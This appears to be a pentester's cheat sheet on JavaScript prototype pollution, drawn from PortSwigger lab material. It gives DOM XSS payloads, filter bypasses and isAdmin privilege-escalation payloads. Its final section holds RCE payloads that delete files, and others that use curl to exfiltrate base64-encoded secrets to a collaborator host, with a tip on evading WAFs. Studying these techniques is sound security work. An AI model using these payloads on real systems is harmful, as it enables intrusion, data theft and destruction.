![[Prototype Pollution.webp]]
# Recon

- [https://portswigger.net/web-security/prototype-pollution/client-side](https://portswigger.net/web-security/prototype-pollution/client-side)
- https://portswigger.net/web-security/prototype-pollution/server-side
# Tools

- Server-Side Prototype Pollution Scanner - [https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8](https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8)
- DOM Invader (Client-side Prototype Pollution) - [https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution)
# Cheat Sheet

As a quick reference for prototype pollution via the URL:

```bash
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```

Or for prototype pollution via JSON input:

```json
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

```json
"constructor": {
    "prototype": {
        "evilProperty": "payload"
    }
}
```
# Client-Side Prototype Pollution - DOM XSS

Identify a prototype pollution source. Try injecting an arbitrary property via a query string and determine if it has polluted the Object prototype:

- `/?__proto__.foo=bar`
- `/?__proto__[foo]=bar`

Then, type the following into the browser's console and see if the Object has been polluted:

- Object.prototype

Then, identify a gadget. Look through the clients-side source code and identify if there is an Object using a property in an insecure way. For example, if we identify an object (config) using a property (transport_url) that is not defined, and used in a dangerous sink, we can try to pollute that property in the Object prototype:

```javascript
if(config.transport_url) { 
let script = document.createElement('script');
script.src = config.transport_url;
document.body.appendChild(script);
}
```

To craft an exploit, use the source identified in the first step and attempt to pollute the "transport_url" property:

- `/?__proto__.transport_url=data:,alert(1);`
- `/?__proto__[transport_url]=data:,alert(1);`

For other scenarios, the client-side code may have some extra protections that are flawed, such as removing key words but not doing it recursively. Some payloads to bypass this validation include:

- `/?__pro__proto__to__[transport_url]=data:,alert(1);`
- `/?__pro__proto__to__.transport_url=data:,alert(1);`
- `/?constconstructorructor.[protoprototypetype][transport_url]=data:,alert(1);`
- `/?constconstructorructor.protoprototypetype.transport_url=data:,alert(1);`

Another scenario may be that the app is using the user input within an eval() function. To trigger an XSS vulnerability, it is required "break" out of the context (use hyphens):

- Example payload: `?__proto__.sequence=-alert(1)-`
# Client-Side Prototype Pollution - Third-Party Libraries

Use DOM Invader to exploit these scenarios as it will save a lot of time. DOM Invader is straight forward to use. Look at the solution for the following lab to learn more about it - [https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-in-third-party-libraries)
# Client-Side Prototype Pollution - Browser APIs

Identify a prototype pollution source by injecting an arbitrary property via a query string and determine if it has polluted the Object prototype.

- `/?__proto__.foo=bar`
- `/?__proto__[foo]=bar`

Type the following in the browser console and see if the Object has been polluted:

- `Object.prototype`

Identify a gadget by looking through the client-side source code and identify if there is an Object using a property in an insecure way. For example, the code is using the method Object.defineProperty() to define the property "transport_url", however, the "value" descriptor which is used to define the value associated with the property is not being defined:

```javascript
Object.defineProperty(config, 'transport_url', {
	configurable: false,
	writable: false
	// missing -> value: "test"
});
```

The "config" Object is not defining the "value" descriptor for "transport_url" property, we can try to pollute the Object prototype with the "value" property containing a malicious payload.

>[!info]
>https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty

To craft an exploit:

- `/?__proto__[value]=data:,alert(1);`
- `/?__proto__.value=data:,alert(1);`
# Server-Side Prototype Pollution - Priv Esc

Identify functionality on the application where JSON data is returned in a response that appears to represent your "User" Object. An example response:

```json
{
"username":"test",
"firstname":"test",
"isAdmin":false
}
```

Then, identify a prototype pollution source. In the request body, add a new property to the JSON with the name __proto__, containing an object with an arbitrary property. An example payload:

```json
"__proto__": {
	"foo":"bar"
}
```

If in the response you see the "foo" property added, without the "__proto__" property, this suggests that we may have polluted the Object's prototype and that the "foo" property has been inherited via prototype chain.

Identify a gadget. The "isAdmin" property would be something to target for privilege escalation. And then craft a payload with an example being:

```json
"__proto__": {
    "isAdmin":true
}
```

In the response, if you see the following it suggests that the "User" object did not have its own "isAdmin“ property, and instead inherited from the polluted prototype. An example response:

```json
{
"username":"test",
"firstname":"test",
"isAdmin":true
}
```

The application may be performing some filtering on the input, one way to bypass it is by using the constructor:

```json
"constructor": {
    "prototype": {
        "isAdmin":true
    }
}
```
# Detecting Prototype Pollution without Polluted Property Reflection

There are 3 main techniques:

- Status code override
- JSON spaces override
- Charset override

>[!info]
>https://portswigger.net/web-security/prototype-pollution/server-side#detecting-server-side-prototype-pollution-without-polluted-property-reflection

First, identify prototype pollution source via the JSON spaces technique:

```json
"__proto__":{
	"json spaces":10
}
```

If the prototype pollution payload was successful, you can see a notable difference in the response, while not breaking the application's functionality. Burp Suite has an extension that can help to identify server-side prototype pollution: https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8
# Server-Side Prototype Pollution - RCE and Exfiltration

For payloads - inject these into JSON body of HTTP requests:

```json
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```

```json
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
```

Vim has an interactive prompt and expects the user to hit Enter to run the provided command. As a result, you need to simulate this by including a newline (\n) character at the end of your payload, as shown in the examples.

```json
"shell":"vim",
"input":":! <command>\n"
```

```json
"__proto__": {
    "shell":"vim",
    "input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
}
```

To exfiltrate data to Burp Collaborator:

```json
"__proto__": {
    "shell":"vim",
    "input":":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
}
```

```json
"__proto__": {
    "shell":"vim",
    "input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
}
```

The escaped double-quotes in the hostname aren't strictly necessary. However, this can help to reduce false positives by obfuscating the hostname to evade WAFs and other systems that scrape for hostnames.

```json
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```

